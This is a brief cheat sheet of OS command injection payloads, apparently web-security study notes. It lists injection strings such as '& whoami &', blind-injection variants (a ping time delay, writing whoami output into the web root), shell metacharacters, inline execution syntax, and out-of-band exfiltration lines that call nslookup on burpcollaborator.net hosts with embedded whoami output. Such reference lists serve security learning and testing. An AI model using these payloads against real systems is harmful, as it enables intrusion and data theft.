## OS Command Injection:
- & whoami &
- |whoami
- echo hello
- || whoami ||

## Blind OS Command Injection:
- & ping -c 10 127.0.0.1 & (This is will send 10 ICMP packets, so there will be time delay)
- ||whoami > /var/www/html/whoami.txt

## Shell metacharacters for OS Command Injection 
	
### Windows and Unix:
- &
- &&
- |
- ||

### Unix only:
- ;
- Newline (0x0a or \n)

### Inline execution of an injected command within the original command (Unix only):
- \`injected command\`
- $(injected command)

## Data exfiltration through OS Command Injection (OAST):
- ||nslookup 9jtnjcnvxt3qxavtcqhp252vemkc81.burpcollaborator.net||
- ||nslookup \`whoami\`.hacker.burpcollaborator.net||